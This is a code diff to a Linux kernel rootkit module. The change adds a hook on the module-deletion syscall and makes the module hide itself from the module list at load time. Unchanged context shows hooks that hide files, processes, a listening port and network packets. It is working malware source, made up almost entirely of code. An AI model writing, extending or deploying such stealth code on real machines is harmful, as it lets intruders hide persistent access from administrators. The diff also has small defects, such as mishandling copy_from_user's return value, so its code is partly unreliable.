@@ -21,7 +21,8 @@
 #define PREFIX "rootkit"
 // listen port to hide
 #define H_PORT 8080
-
+// rootkit name that is valid to remove
+#define rootkit_name "rootkit"
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.02");
 
@@ -34,6 +35,9 @@ static asmlinkage long (*original_packet_rcv_spkt)(struct sk_buff *, struct net_
     struct packet_type *, struct net_device *);
 static struct list_head *prev_module;
 static short hidden = 0;
+
+void showme(void);
+void hideme(void);
 /* After Kernel 4.17.0, the way that syscalls are handled changed
  * to use the pt_regs struct instead of the more familar function
  * prototype declaration. We have to check for this, and set a
@@ -55,6 +59,44 @@ static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
+static asmlinkage long (*orig_delete_module_func)(const struct pt_regs *);
+
+
+
+asmlinkage long delete_module_func(const struct pt_regs *regs)
+{
+    long ret;
+    //add find_module fuction from kernal
+
+
+    char module_name[MODULE_NAME_LEN];
+    int name_len;
+    struct module mod;
+    const char __user *name_user = (const char __user *)regs->di;
+    //copy from user
+    name_len = copy_from_user(module_name, name_user, MODULE_NAME_LEN -1 );
+    printk(KERN_INFO "name_len %d", name_len);
+    if (name_len < 0 ) {
+        printk(KERN_INFO "failed");
+        goto done;     
+    }
+    //adding null bit at the end
+    module_name[MODULE_NAME_LEN - 1] = '\0';
+    printk(KERN_INFO "module_name: %s ,rootkit name: %s and the strcmp: %d \n",module_name,rootkit_name, strcmp(module_name,rootkit_name));
+
+    if  (strcmp(module_name,rootkit_name) == 0){
+        printk(KERN_INFO "deleting myself");
+        if (hidden == 1){
+        showme();
+        }
+    } 
+
+done:
+    printk(KERN_INFO "done");
+    ret = orig_delete_module_func(regs);    
+    return ret;
+}
+
 
 /* After grabbing the sig out of the pt_regs struct, just check
  * for signal 64 (unused normally) and, using "hidden" as a toggle
@@ -452,7 +494,7 @@ int packet_check(struct sk_buff *skb)
     if (skb->protocol == htons(ETH_P_IP)) {
         /* get ipv4 header */
         struct iphdr *header = ip_hdr(skb);
-        printk("got ip4 message from %x", header->saddr);
+        // printk("got ip4 message from %x", header->saddr);
         /* look for source and destination address */
         if( ipv4_filter_sorce == header->saddr  || ipv4_filter_dest == header->daddr) {
             printk("IPV4 SENDER %x I4 IN LIST", header->saddr);
@@ -568,6 +610,7 @@ static struct ftrace_hook hooks[] = {
     HOOK("tpacket_rcv", hook_tpacket_rcv, &original_tpacket_rcv),
     HOOK("packet_rcv_spkt", hook_packet_rcv_spkt, &original_packet_rcv_spkt),
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("__x64_sys_delete_module", delete_module_func, &orig_delete_module_func),
 };
 
 /* Module initialization function */
@@ -578,7 +621,8 @@ static int __init rootkit_init(void)
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
-
+    hideme();
+    hidden = 1;
     printk(KERN_INFO "rootkit: Loaded >:-)\n");
 
     return 0;
